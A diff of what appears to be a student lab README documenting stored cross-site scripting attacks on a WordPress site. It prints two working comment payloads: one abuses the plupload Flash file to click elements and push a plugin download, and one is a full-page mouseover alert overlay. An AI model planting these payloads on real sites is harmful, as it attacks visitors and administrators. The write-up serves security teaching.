@@ -25,15 +25,15 @@ Created virtual environment in Docker.
 	1. As a logged in user, leaving a reply/comment to a post using the payload:
 			
 	2.		
-			```json
-			<button onclick="fire()">Click</button>
-			<script>
-			function fire() {
-			open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
-			setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
+			
+		<button onclick="fire()">Click</button>
+		<script>
+		function fire() {
+		open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
+		setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
 				}
-			</script>	
-			```
+		</script>	
+			
 	3. After this comment posts sucessfully, any user that comes across the post will see a clickable button within the comment. If that user clicks the button, the XSS attack will execute and attempt to download a malicious payload from the attack. 
 			
 	4. In the gif walkthrough, my browser extentions sucessfully blocks the attack from downloading the file, but a user without the proper safeguards would be prompted to download a file. 
@@ -56,9 +56,9 @@ Created virtual environment in Docker.
 	1. As a logged in user, leaving a reply/comment to a post using the payload:
 			
 	2.		
-			```json
-			<a href='/wp-admin/' title="XSS" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(2)//'Hello World</a>	
-			```
+			
+		<a href='/wp-admin/' title="XSS" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(2)//'Hello World</a>	
+			
 	3. After this comment posts sucessfully, any user that comes to the page and mouses over the area will see an alert box demonstrating the xss attack. The alert box will keep popping up everytime the area is hover overed with the mouse cursor. 
   
   - [ ] References:
